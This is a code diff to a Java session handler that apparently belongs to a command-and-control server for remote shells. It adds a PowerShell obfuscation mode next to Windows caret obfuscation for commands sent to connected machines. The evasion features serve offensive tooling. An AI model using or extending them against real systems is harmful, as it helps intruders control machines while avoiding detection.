@@ -13,10 +13,6 @@ public class SessionHandler implements Runnable {
 
 	public static final String NEW_SESSION_BANNER = "New session: ";
 	
-	public static final String START_OBFUSCATE_WINDOWS_COMMAND = "<start esc>";
-	public static final String END_OBFUSCATE_WINDOWS_COMMAND = "<end esc>";
-	public static final String OBFUSCATE_WINDOWS_COMMAND_PREFIX = "<esc> ";
-	
 	private IOManager ioManager;
 	private Socket socket;
 	private int sessionId;
@@ -24,6 +20,7 @@ public class SessionHandler implements Runnable {
 	private boolean stayAlive = true;
 	private CommandMacroManager cmm;
 	private boolean obfuscateWindowsCommandMode = false;
+	private boolean obfuscateWindowsPowershellMode = false;
 	
 	public SessionHandler(IOManager ioManager, Socket socket, int sessionId, String sessionName, CommandMacroManager cmm) {
 		this.ioManager = ioManager;
@@ -76,15 +73,21 @@ public class SessionHandler implements Runnable {
 					}else if(command.equalsIgnoreCase(Commands.SERVER_CMD_LIST_ALL_MACROS)) {
 						bw.write(cmm.getListOfMacros() + System.lineSeparator());
 						bw.flush();
-					}else if(command.equals(START_OBFUSCATE_WINDOWS_COMMAND)) {
+					}else if(command.equals(Commands.SESSION_START_OBFUSCATED_POWERSHELL_MODE)) {
+						obfuscateWindowsPowershellMode = true;
+					}else if(command.equals(Commands.SESSION_END_OBFUSCATED_POWERSHELL_MODE)) {
+						obfuscateWindowsPowershellMode = false;
+					}else if(command.equals(Commands.SESSION_START_OBFUSCATE_WINDOWS_COMMAND)) {
 						obfuscateWindowsCommandMode = true;
-					}else if(command.equals(END_OBFUSCATE_WINDOWS_COMMAND)) {
+					}else if(command.equals(Commands.SESSION_END_OBFUSCATE_WINDOWS_COMMAND)) {
 						obfuscateWindowsCommandMode = false;
 					}else if(!cmm.processCmd(command, sessionId, sessionName)) {
 						if(obfuscateWindowsCommandMode) {
 							command = WindowsCarrotObfuscation.obfuscate(command);
-						}else if(command.startsWith(OBFUSCATE_WINDOWS_COMMAND_PREFIX)) {
-							command = WindowsCarrotObfuscation.obfuscate(command.substring(OBFUSCATE_WINDOWS_COMMAND_PREFIX.length()));
+						}else if(command.startsWith(Commands.SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX)) {
+							command = WindowsCarrotObfuscation.obfuscate(command.substring(Commands.SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX.length()));
+						}else if(obfuscateWindowsPowershellMode) {
+							command = PowershellWrapperObfuscator.process(command);
 						}
 						ioManager.sendCommand(sessionId, command);
 					}else if(command.equals("qSession")) {
